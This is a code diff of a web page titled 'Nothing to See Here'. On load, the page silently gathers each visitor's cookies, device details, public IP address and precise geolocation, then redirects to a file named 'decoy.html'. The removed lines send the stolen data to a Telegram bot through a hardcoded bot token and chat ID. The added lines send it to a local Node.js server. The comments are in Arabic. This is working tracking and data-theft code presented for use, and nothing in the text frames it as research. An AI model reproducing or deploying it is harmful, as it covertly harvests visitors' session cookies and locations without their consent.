@@ -1,82 +1,56 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Nothing to See Here</title>
-</head>
-<body>
-  <script>
-    async function grabAndSendData() {
-      let data = {};
+async function grabAndSendData() {
+  let data = {};
 
-      // 1️⃣ اجمع بيانات الجهاز
-      data.userAgent = navigator.userAgent;
-      data.platform = navigator.platform;
-      data.language = navigator.language;
-      data.screen = `${window.screen.width}x${window.screen.height}`;
-      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      data.cookies = document.cookie || "No cookies found";
+  data.userAgent = navigator.userAgent;
+  data.platform = navigator.platform;
+  data.language = navigator.language;
+  data.screen = `${window.screen.width}x${window.screen.height}`;
+  data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  data.cookies = document.cookie || "No cookies found";
 
-      // 2️⃣ اجمع عنوان IP
-      try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        data.ip = ipData.ip;
-      } catch (e) {
-        data.ip_error = `IP fetch failed: ${e.message}`;
-      }
+  try {
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    data.ip = ipData.ip;
+  } catch (e) {
+    data.ip_error = `IP fetch failed: ${e.message}`;
+  }
 
-      // 3️⃣ اجمع بيانات الموقع (نستخدم Promise للتزامن)
-      data.latitude = null;
-      data.longitude = null;
-      data.accuracy = null;
-      data.geolocation_error = null;
-
-      if (navigator.geolocation) {
-        try {
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-          });
-          data.latitude = position.coords.latitude;
-          data.longitude = position.coords.longitude;
-          data.accuracy = position.coords.accuracy;
-        } catch (err) {
-          data.geolocation_error = `Geolocation blocked: ${err.message}`;
-        }
-      } else {
-        data.geolocation_error = "Geolocation not supported";
-      }
-
-      // 4️⃣ جهز رسالة Telegram
-      const botToken = '7733912783:AAEU-5zLar1DMCW7nohVkss1_l3tNnJ778c';
-      const chatId = '1883036774';
-      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      const message = `New user data:\n${JSON.stringify(data, null, 2)}`;
-
-      // 5️⃣ أرسل إلى Telegram
-      try {
-        await fetch(telegramUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
-      } catch (e) {
-        console.error('Failed to send to Telegram:', e);
-      }
-
-      // 6️⃣ إعادة التوجيه بعد التأكد من الإرسال
-      setTimeout(() => {
-        window.location.href = 'decoy.html';
-      }, 1000);
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+      });
+      data.latitude = position.coords.latitude;
+      data.longitude = position.coords.longitude;
+      data.accuracy = position.coords.accuracy;
+    } catch (err) {
+      data.geolocation_error = `Geolocation blocked: ${err.message}`;
     }
+  } else {
+    data.geolocation_error = "Geolocation not supported";
+  }
 
-    window.onload = () => {
-      grabAndSendData();
-    };
-  </script>
-</body>
-</html>
+  // أرسل البيانات إلى السيرفر Node.js
+  try {
+    const response = await fetch('http://localhost:3000/send-data', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+
+    const result = await response.json();
+    console.log(result);
+  } catch (error) {
+    console.error('Failed to send data to server:', error);
+  }
+
+  // إعادة التوجيه بعد الإرسال
+  setTimeout(() => {
+    window.location.href = 'decoy.html';
+  }, 1000);
+}
+
+window.onload = () => {
+  grabAndSendData();
+};
